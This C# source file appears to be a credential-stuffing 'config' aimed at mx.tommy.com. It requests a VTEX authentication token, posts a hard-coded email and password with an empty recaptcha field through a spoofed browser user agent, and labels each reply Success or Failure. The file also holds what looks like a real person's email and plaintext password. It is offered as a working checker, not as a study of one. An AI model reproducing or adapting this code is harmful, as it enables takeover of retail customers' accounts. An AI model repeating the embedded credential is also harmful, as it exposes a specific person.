using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class tomymx
    {
        public static void tomy()
        {
            string email = "karlagarza_@hotmail.com";
            string pass = "Acuario1";
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                // Set headers for the first GET request
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36";
                req.AddHeader("accept", "*/*");
                req.AddHeader("accept-encoding", "gzip, deflate, br");
                req.AddHeader("accept-language", "es-US,es-419;q=0.9,es;q=0.8,en;q=0.7");
                req.AddHeader("referer", "https://mx.tommy.com/login?ReturnUrl=%2f_secure%2faccount");
                req.AddHeader("vtex-id-ui-version", "3.15.25");

                string url = "https://mx.tommy.com/api/vtexid/pub/authentication/start?callbackUrl=https%3A%2F%2Fmx.tommy.com%2Fapi%2Fvtexid%2Fpub%2Fauthentication%2Ffinish&scope=tommymx&user=&locale=es-MX&accountName=&returnUrl=%252F_secure%252Faccount&appStart=true";
                string send_data = req.Get(url).ToString();

                // Parse authenticationToken from the response
                var Credit = Fuctions.Parsing.JSON(send_data, "authenticationToken", true, false);
                string authenticationToken = string.Join(", ", Credit);
                Console.WriteLine(authenticationToken);


                // Set headers for the POST request
                req.AddHeader("Pragma", "no-cache");

                string postData = $"recaptcha=&login=" + email +"&authenticationToken=" + authenticationToken + "&password=" + pass +"&&method=POST";
                send_data = req.Post("https://mx.tommy.com/api/vtexid/pub/authentication/classic/validate", postData, "application/x-www-form-urlencoded").ToString();

                // Check the response
                if (send_data.Contains("\"authStatus\": \"Success\","))
                {
                    Console.WriteLine("Success");
                }
                else if (send_data.Contains("WrongCredentials") || send_data.Contains("\"authStatus\": \"InvalidEmail\","))
                {
                    Console.WriteLine("Failure");
                }
                Console.WriteLine(send_data);
            }

        }
    }
}
